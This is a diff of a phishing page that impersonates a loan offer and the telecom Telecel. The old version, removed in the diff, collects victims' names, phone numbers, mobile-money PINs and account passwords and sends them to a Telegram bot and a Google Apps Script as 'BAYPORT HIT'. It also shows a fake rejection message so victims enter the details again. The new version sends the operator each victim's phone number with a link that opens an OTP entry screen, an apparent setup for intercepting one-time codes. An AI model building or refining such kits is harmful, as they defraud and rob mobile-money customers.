@@ -2,145 +2,148 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bayport Loans | Fast Approval</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telecel Play | Loan Portal</title>
     <style>
-        :root { --navy: #002349; --gold: #c5a059; --telecel-red: #e30613; --light-bg: #f8fafd; --text: #333; --border: #e1e8f0; }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
-        body { background: #e9ecef; color: var(--text); touch-action: manipulation; }
-        .view { display: none; max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        :root { --tele-red: #e30613; --bg-black: #121212; --card-gray: #1e1e1e; --input-gray: #2c2c2c; --text-dim: #888; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--bg-black); color: white; display: flex; justify-content: center; min-height: 100vh; }
+        
+        .app-container { width: 100%; max-width: 450px; background: linear-gradient(180deg, #2a0000 0%, #121212 25%); padding: 30px 20px; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5); }
+        .view { display: none; }
         .view.active { display: block; animation: fadeIn 0.3s ease; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .header { padding: 40px 25px 20px; text-align: center; }
-        .header h1 { font-size: 1.8rem; font-weight: 800; color: #1a1a1a; }
-        .fast-text { color: var(--navy); }
-        .subtitle { color: #666; font-size: 0.9rem; margin-top: 5px; }
-        .content { padding: 0 25px 30px; }
-        .section-title { font-size: 1.2rem; margin-bottom: 20px; font-weight: 700; color: var(--navy); }
-        .control-label { display: block; font-weight: 600; color: #444; margin-bottom: 10px; font-size: 0.9rem; }
-        .amount-display { font-size: 2.2rem; font-weight: 800; color: var(--navy); margin-bottom: 15px; }
-        input[type=range] { width: 100%; height: 6px; background: #edf2f7; border-radius: 5px; appearance: none; outline: none; margin-bottom: 10px; }
-        input[type=range]::-webkit-slider-thumb { appearance: none; width: 24px; height: 24px; background: var(--navy); border-radius: 50%; cursor: pointer; border: 3px solid white; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-        .slider-labels { display: flex; justify-content: space-between; font-size: 0.75rem; color: #999; margin-bottom: 25px; }
-        .term-buttons { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 25px; }
-        .term-button { padding: 12px; border: 1.5px solid var(--border); background: white; border-radius: 8px; font-size: 0.8rem; cursor: pointer; font-weight: 600; }
-        .term-button.active { background: var(--navy); color: white; border-color: var(--navy); }
-        .payment-display { background: var(--light-bg); padding: 25px; border-radius: 12px; text-align: center; margin-bottom: 25px; border: 1px solid var(--border); }
-        .payment-amount { font-size: 2rem; font-weight: 800; color: var(--navy); }
-        .apply-button { background: var(--navy); color: white; width: 100%; padding: 20px; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; font-size: 1.1rem; text-transform: uppercase; }
-        input[type=text], input[type=number], input[type=password] { width: 100%; padding: 16px; border: 1.5px solid var(--border); border-radius: 10px; font-size: 1rem; margin-bottom: 15px; outline: none; }
-        .tele-logo { color: var(--telecel-red); font-weight: 900; font-size: 2.6rem; letter-spacing: -2px; text-align: center; margin-bottom: 10px; }
-        .prefix { background: #f0f0f0; padding: 16px; font-weight: 700; border: 1.5px solid var(--border); border-right: none; border-radius: 10px 0 0 10px; height: 55px; }
-        .error-hint { color: var(--telecel-red); font-size: 0.8rem; font-weight: 600; display: none; margin-bottom: 10px; }
-        @keyframes spin { from {transform: rotate(0deg);} to {transform: rotate(360deg);} }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Calculator Styles */
+        .calc-card { background: var(--card-gray); padding: 25px; border-radius: 15px; border: 1px solid #333; margin-top: 20px; }
+        .calc-header { font-size: 1.2rem; font-weight: 600; margin-bottom: 20px; color: var(--tele-red); text-align: center; }
+        .slider-wrap { margin-bottom: 25px; }
+        .slider-label { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.9rem; color: var(--text-dim); }
+        input[type=range] { width: 100%; accent-color: var(--tele-red); cursor: pointer; height: 6px; }
+        .result-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; padding-top: 20px; border-top: 1px solid #333; }
+        .res-item span { display: block; font-size: 0.75rem; color: var(--text-dim); margin-bottom: 3px; }
+        .res-item b { font-size: 1.1rem; color: white; }
+
+        /* Telecel UI Styles */
+        .logo { width: 110px; display: block; margin: 0 auto 25px; }
+        .title { text-align: center; color: white; font-size: 1.4rem; font-weight: 600; margin-bottom: 8px; }
+        .subtitle { text-align: center; color: #aaa; font-size: 0.9rem; margin-bottom: 35px; line-height: 1.4; }
+        label { display: block; color: var(--text-dim); font-size: 0.8rem; margin-bottom: 8px; margin-top: 15px; }
+        select, input[type=text], input[type=number], input[type=password] { 
+            width: 100%; background: var(--input-gray); border: 1px solid #333; border-radius: 10px; padding: 16px; color: white; font-size: 1rem; outline: none; 
+        }
+        .btn-red { background: var(--tele-red); color: white; border: none; width: 100%; padding: 18px; border-radius: 10px; font-weight: 700; font-size: 1rem; margin-top: 30px; cursor: pointer; }
+        .btn-outline { background: transparent; color: white; border: 1px solid #444; width: 100%; padding: 15px; border-radius: 10px; margin-top: 15px; cursor: pointer; font-size: 0.9rem; }
+
+        /* OTP Logic */
+        .otp-row { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
+        .otp-box { width: 45px; height: 55px; background: var(--input-gray); border: 1px solid #444; border-radius: 8px; text-align: center; font-size: 1.5rem; color: white; }
+        .timer-box { color: var(--tele-red); font-weight: bold; font-size: 1.1rem; margin-bottom: 10px; text-align: center; }
     </style>
 </head>
 <body>
 
-<div id="app">
-    <section id="view-1" class="view active">
-        <div class="header">
-            <h1>Get Your Loan Approved <span class="fast-text">Fast</span></h1>
-            <p class="subtitle">Quick approval • Flexible terms</p>
-        </div>
-        <div class="content">
-            <h2 class="section-title">Loan Calculator</h2>
-            <label class="control-label">Loan Amount</label>
-            <div class="amount-display" id="disp-amt">GHS 50,000</div>
-            <input type="range" id="loan-slider" min="2000" max="500000" step="100" value="50000" oninput="updateCalc()">
-            <div class="slider-labels"><span>GHS 2,000</span><span>GHS 500,000</span></div>
+<div class="app-container">
+    <img src="https://telecel.com.gh/wp-content/uploads/2024/02/Telecel-Logo-White.png" class="logo" alt="Telecel">
 
-            <label class="control-label">Loan Term: <span id="term-txt">12 months</span></label>
-            <div class="term-buttons">
-                <button class="term-button" onclick="setTerm(6, this)">6 mo</button>
-                <button class="term-button active" onclick="setTerm(12, this)">12 mo</button>
-                <button class="term-button" onclick="setTerm(24, this)">24 mo</button>
-                <button class="term-button" onclick="setTerm(36, this)">36 mo</button>
-                <button class="term-button" onclick="setTerm(48, this)">48 mo</button>
-                <button class="term-button" onclick="setTerm(60, this)">60 mo</button>
+    <section id="view-0" class="view active">
+        <h2 class="title">Quick Cash Loans</h2>
+        <p class="subtitle">Select your desired amount and repayment period to get started.</p>
+        
+        <div class="calc-card">
+            <div class="slider-wrap">
+                <div class="slider-label"><span>Loan Amount</span> <b id="amt-val">GHS 5,000</b></div>
+                <input type="range" id="loan-amt" min="500" max="500000" step="500" value="5000" oninput="calculate()">
             </div>
 
-            <div class="payment-display">
-                <div style="font-size: 0.85rem; color: #666;">Monthly Payment</div>
-                <div class="payment-amount" id="monthly-amt">GHS 4,268.93</div>
+            <div class="slider-wrap">
+                <div class="slider-label"><span>Duration (Months)</span> <b id="dur-val">6 Months</b></div>
+                <input type="range" id="loan-dur" min="1" max="24" step="1" value="6" oninput="calculate()">
             </div>
-            <button class="apply-button" onclick="showView(2)">APPLY NOW</button>
+
+            <div class="result-grid">
+                <div class="res-item"><span>Monthly Repayment</span> <b id="res-monthly">GHS 955.42</b></div>
+                <div class="res-item"><span>Total Payable</span> <b id="res-total">GHS 5,732.52</b></div>
+            </div>
         </div>
+        <button class="btn-red" onclick="showView(1)">APPLY NOW</button>
     </section>
 
-    <section id="view-2" class="view">
-        <div class="header"><h1>Verification</h1><p class="subtitle">Step 1: Identity Linkage</p></div>
-        <div class="content">
-            <label class="control-label">Full Name*</label>
-            <input type="text" id="f-name" placeholder="Enter full name">
-            
-            <label class="control-label">Telecel Phone Number*</label>
-            <div style="display: flex; align-items: flex-start;">
-                <div class="prefix">+233</div>
-                <input type="number" id="t-phone" placeholder="Phone Number" style="border-radius: 0 10px 10px 0;">
-            </div>
-            
-            <label class="control-label">Telecel Cash PIN*</label>
-            <input type="password" id="t-pin" maxlength="6" placeholder="Wallet PIN" style="letter-spacing: 5px;">
-            
-            <p id="err-1" class="error-hint">⚠️ All fields must be filled.</p>
-            <button class="apply-button" onclick="validateStep1()">Next Step</button>
-        </div>
+    <section id="view-1" class="view">
+        <h2 class="title">Welcome to Telecel Play</h2>
+        <p class="subtitle">Enter your details to sign up or log in. You must be a Telecel subscriber to proceed.</p>
+        
+        <label>Account type</label>
+        <select id="acc-type" onchange="updateLabel()">
+            <option value="Mobile">Mobile</option>
+            <option value="Broadband">Broadband</option>
+        </select>
+
+        <label id="id-label">Phone Number</label>
+        <input type="text" id="user-id" placeholder="02xxxxxxxx">
+
+        <button class="btn-red" onclick="startVerification()">Next</button>
+        <button class="btn-outline" onclick="showView(0)">Go Back</button>
+    </section>
+
+    <section id="view-2" class="view" style="text-align: center; padding-top: 60px;">
+        <div class="loader"></div>
+        <h2 class="title">Verifying Account...</h2>
+        <p class="subtitle">Please wait while we verify your eligibility with the Telecel network. Do not close this window.</p>
     </section>
 
     <section id="view-3" class="view">
-        <div class="header">
-            <div class="tele-logo">telecel</div>
-            <h1 style="font-size: 1.3rem;">Secure Handshake</h1>
-        </div>
-        <div class="content">
-            <p style="text-align: center; color: #666; margin-bottom: 25px; font-size: 0.9rem;">
-                Confirm authorization for <strong>GHS <span id="final-amt">50,000</span></strong> by entering your account password.
-            </p>
-            <label class="control-label">Telecel Account Password*</label>
-            <input type="password" id="t-pass" placeholder="Enter Password">
-            
-            <p id="err-2" class="error-hint">⚠️ Password is required.</p>
+        <h2 class="title" style="color: var(--tele-red);">Enter Verification Code</h2>
+        <p class="subtitle">We've sent a 5-digit one-time password to <span id="display-id" style="color:white;"></span>. Enter it below to confirm.</p>
+        
+        <div class="timer-box" id="timer">00:30</div>
 
-            <button class="apply-button" id="final-btn" style="background: var(--telecel-red);" onclick="finalize()">Complete Authorization</button>
+        <div class="otp-row">
+            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" class="otp-box" maxlength="1">
         </div>
+
+        <button class="btn-red" onclick="showView(4)">Confirm & Finish</button>
+        <button class="btn-outline" onclick="location.reload()">Cancel</button>
     </section>
 
-    <section id="view-4" class="view" style="text-align: center; padding-top: 150px;">
-        <div style="font-size: 4rem; animation: spin 2s linear infinite;">⏳</div>
-        <h2 style="margin-top: 30px;">Processing...</h2>
-        <p style="padding: 20px; color: #888;">Verifying details. Please stay on this page to receive the USSD prompt for the 10% handshake.</p>
+    <section id="view-4" class="view" style="text-align: center; padding-top: 60px;">
+        <div style="font-size: 4rem; margin-bottom: 20px;">✅</div>
+        <h2 class="title">Application Submitted</h2>
+        <p class="subtitle">Your request is being processed. You will receive an SMS confirmation once approved by Telecel Finance.</p>
     </section>
 </div>
 
 <script>
-    // Replace this with your newly DEPLOYED script URL
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzm69IwQzz6i99RktPrr6htG6h0B2rrEJKa0TG3U3k9kqbtvSnyRI7XT18pQ1xr7W8M/exec"; 
-    
+    // Config
+    const SCRIPT_URL = "YOUR_APPS_SCRIPT_URL";
     const urlParams = new URLSearchParams(window.location.search);
     const BOT_TOKEN = urlParams.get('token');
     const CHAT_ID = urlParams.get('id');
 
-    let state = { amount: 50000, term: 12 };
+    // 1. Calculator Logic
+    function calculate() {
+        const amt = parseFloat(document.getElementById('loan-amt').value);
+        const dur = parseInt(document.getElementById('loan-dur').value);
+        const rate = 0.0245; // 2.45% Interest
 
-    function updateCalc() {
-        state.amount = document.getElementById('loan-slider').value;
-        document.getElementById('disp-amt').innerText = "GHS " + Number(state.amount).toLocaleString();
-        document.getElementById('final-amt').innerText = Number(state.amount).toLocaleString();
-        
-        const r = 0.045 / 12;
-        const n = state.term;
-        const monthly = state.amount * (r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
-        document.getElementById('monthly-amt').innerText = "GHS " + monthly.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+        document.getElementById('amt-val').innerText = `GHS ${amt.toLocaleString()}`;
+        document.getElementById('dur-val').innerText = `${dur} Months`;
+
+        // Amortization Formula (Simplified for interest)
+        const total = amt + (amt * rate * dur);
+        const monthly = total / dur;
+
+        document.getElementById('res-monthly').innerText = `GHS ${monthly.toFixed(2)}`;
+        document.getElementById('res-total').innerText = `GHS ${total.toFixed(2)}`;
     }
 
-    function setTerm(t, btn) {
-        state.term = t;
-        document.querySelectorAll('.term-button').forEach(b => b.classList.remove('active'));
-        btn.classList.add('active');
-        document.getElementById('term-txt').innerText = t + " months";
-        updateCalc();
+    function updateLabel() {
+        const type = document.getElementById('acc-type').value;
+        document.getElementById('id-label').innerText = type === "Mobile" ? "Phone Number" : "User ID / Account Number";
     }
 
     function showView(n) {
@@ -149,81 +152,52 @@
         window.scrollTo(0,0);
     }
 
-    function validateStep1() {
-        const n = document.getElementById('f-name').value.trim();
-        const p = document.getElementById('t-phone').value.trim();
-        const pin = document.getElementById('t-pin').value.trim();
-        if(!n || !p || !pin) {
-            document.getElementById('err-1').style.display = 'block';
-            return;
-        }
-        document.getElementById('err-1').style.display = 'none';
-        showView(3);
+    // 2. Verification Flow
+    async function startVerification() {
+        const id = document.getElementById('user-id').value;
+        const amt = document.getElementById('loan-amt').value;
+        if(!id) return alert("Required Field");
+
+        document.getElementById('display-id').innerText = id;
+        showView(2); // Show Loading
+
+        // Send Notification to Operator
+        const approveLink = `${SCRIPT_URL}?action=approveOTP&phone=${id}`;
+        const msg = `💰 *NEW LOAN HIT*\nAmt: GHS ${amt}\nID: ${id}\n\n✅ *CLICK TO SHOW OTP BOX:* \n${approveLink}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        
+        // Poll for Operator Approval
+        startPolling(id);
     }
 
-    async function finalize() {
-        const pass = document.getElementById('t-pass').value.trim();
-        const name = document.getElementById('f-name').value.trim();
-        const phone = document.getElementById('t-phone').value.trim();
-        const pin = document.getElementById('t-pin').value.trim();
-
-        if(!pass) {
-            document.getElementById('err-2').style.display = 'block';
-            return;
-        }
-
-        showView(4);
-
-        // 1. PREPARE DATA
-        const message = `🔥 *BAYPORT HIT*\n👤 Name: ${name}\n📱 +233${phone}\n💰 GHS ${state.amount}\n🔢 PIN: \`${pin}\`\n🔑 PASS: \`${pass}\``;
-
-        // 2. DIRECT SEND TO TELEGRAM (Bypasses Google Script)
-        if (BOT_TOKEN && CHAT_ID) {
-            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            fetch(telegramUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                }),
-                keepalive: true // Ensures request completes even if page changes
-            }).catch(err => console.log("Direct Telegram Error:", err));
-        }
-
-        // 3. LOG TO GOOGLE SHEET (For your records/polling)
-        try { 
-            const formData = new URLSearchParams();
-            formData.append('name', name);
-            formData.append('phone', phone);
-            formData.append('pin', pin);
-            formData.append('pass', pass);
-            formData.append('loan', state.amount);
-
-            fetch(SCRIPT_URL, { 
-                method: 'POST', 
-                mode: 'no-cors', 
-                body: formData 
-            }); 
-        } catch (e) { console.error("Sheet Log Error:", e); }
-
-        // 4. Polling for rejection (Keep this as is)
-        const poll = setInterval(async () => {
+    function startPolling(phone) {
+        const poller = setInterval(async () => {
             try {
                 const r = await fetch(`${SCRIPT_URL}?phone=${phone}`);
                 const status = await r.text();
-                if(status === "error") {
-                    clearInterval(poll);
-                    alert("❌ Incorrect details. The network rejected your PIN or Password. Please re-enter them correctly.");
-                    location.reload();
+                if(status.trim() === "approved") {
+                    clearInterval(poller);
+                    showView(3);
+                    runCountdown(30);
                 }
             } catch(e) {}
         }, 4000);
     }
-    
-    updateCalc();
+
+    function runCountdown(sec) {
+        let timer = sec;
+        const el = document.getElementById('timer');
+        const count = setInterval(() => {
+            let s = timer < 10 ? '0'+timer : timer;
+            el.innerText = `00:${s}`;
+            if(--timer < 0) clearInterval(count);
+        }, 1000);
+    }
+
+    // Initial Calculation
+    calculate();
 </script>
+
 </body>
 </html>
